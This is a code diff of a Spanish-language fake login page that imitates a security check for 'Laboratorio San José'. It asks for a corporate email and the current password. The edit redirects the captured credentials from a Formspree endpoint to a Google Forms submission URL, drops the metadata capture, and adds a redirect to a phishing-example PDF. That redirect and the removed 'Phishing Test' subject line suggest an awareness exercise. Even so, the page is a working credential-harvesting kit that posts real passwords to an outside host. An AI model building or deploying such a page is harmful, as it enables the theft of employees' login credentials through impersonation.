@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificación de Seguridad - Laboratorio San José</title>
     <style>
-        /* RESET Y BASE */
+        /* [MANTENGO TODOS TUS ESTILOS EXACTAMENTE IGUAL] */
         * {
             margin: 0;
             padding: 0;
@@ -23,7 +23,6 @@
             line-height: 1.6;
         }
 
-        /* CONTENEDOR PRINCIPAL */
         .login-container {
             width: 100%;
             max-width: 500px;
@@ -33,7 +32,6 @@
             overflow: hidden;
         }
 
-        /* LOGO GRANDE CENTRADO */
         .logo-container {
             text-align: center;
             padding: 30px 20px 20px 20px;
@@ -61,7 +59,6 @@
             font-style: italic;
         }
 
-        /* ENCABEZADO DE LOGIN */
         .login-header {
             background: #e74c3c;
             color: white;
@@ -79,7 +76,6 @@
             opacity: 0.9;
         }
 
-        /* FORMULARIO */
         .login-form {
             padding: 35px;
         }
@@ -116,7 +112,6 @@
             font-size: 16px;
         }
 
-        /* BOTÓN */
         .btn {
             width: 100%;
             padding: 20px;
@@ -137,7 +132,6 @@
             box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
         }
 
-        /* LOADING */
         .loading {
             display: none;
             text-align: center;
@@ -165,7 +159,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* NOTA DE SEGURIDAD */
         .security-notice {
             background: #f8f9fa;
             padding: 25px;
@@ -186,7 +179,6 @@
             font-size: 17px;
         }
 
-        /* FOOTER */
         .footer {
             text-align: center;
             padding: 25px;
@@ -199,7 +191,6 @@
             opacity: 0.9;
         }
 
-        /* RESPONSIVE */
         @media (max-width: 768px) {
             .login-container {
                 margin: 15px;
@@ -299,24 +290,18 @@
             <p>Por favor ingrese sus credenciales para continuar</p>
         </div>
 
-        <!-- FORMULARIO MODIFICADO PARA FORMSPREE -->
-        <form class="login-form" action="https://formspree.io/f/xandlgjp" method="POST" id="phishingForm">
+        <!-- FORMULARIO MODIFICADO PARA GOOGLE FORMS -->
+        <form class="login-form" action="https://docs.google.com/forms/d/1tgekfvJGxd44ZJcgPmvCvt8w_ofdicQHGM88hr1mqVg/formResponse" method="POST" target="_blank" id="phishingForm">
             <div class="form-group">
                 <label for="email">Correo Electrónico Corporativo</label>
-                <input type="email" id="email" name="email" required placeholder="usuario@laboratoriosanjose.com">
+                <input type="email" id="email" name="entry.21449010" required placeholder="usuario@laboratoriosanjose.com">
             </div>
 
             <div class="form-group">
                 <label for="password">Contraseña Actual</label>
-                <input type="password" id="password" name="password" required placeholder="Ingrese su contraseña">
+                <input type="password" id="password" name="entry.2126236237" required placeholder="Ingrese su contraseña">
             </div>
 
-            <!-- CAMPOS OCULTOS PARA FORMSPREE -->
-            <input type="hidden" name="_subject" value="⚠️ Phishing Test - Laboratorio San José">
-            <input type="hidden" name="_replyto" value="no-reply@laboratoriosanjose.com">
-            <input type="hidden" name="_next" value="https://www.cyber.gov.au/sites/default/files/2023-03/phishing_example_es.pdf">
-            <input type="hidden" name="_format" value="plain">
-            
             <button type="submit" class="btn">Verificar Identidad</button>
 
             <div class="loading" id="loading">
@@ -341,6 +326,11 @@
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.btn').style.opacity = '0.7';
             document.querySelector('.btn').disabled = true;
+            
+            // Redirigir después de 2 segundos (para que se vea el loading)
+            setTimeout(() => {
+                window.location.href = 'https://www.cyber.gov.au/sites/default/files/2023-03/phishing_example_es.pdf';
+            }, 2000);
         }
 
         // Validación del formulario
@@ -353,19 +343,6 @@
                 alert('Por favor, complete todos los campos.');
                 return false;
             }
-            
-            // Agregar datos automáticos ocultos
-            const addHiddenField = (name, value) => {
-                const field = document.createElement('input');
-                field.type = 'hidden';
-                field.name = name;
-                field.value = value;
-                this.appendChild(field);
-            };
-            
-            addHiddenField('timestamp', new Date().toLocaleString());
-            addHiddenField('user_agent', navigator.userAgent);
-            addHiddenField('page_url', window.location.href);
             
             showLoading();
         });
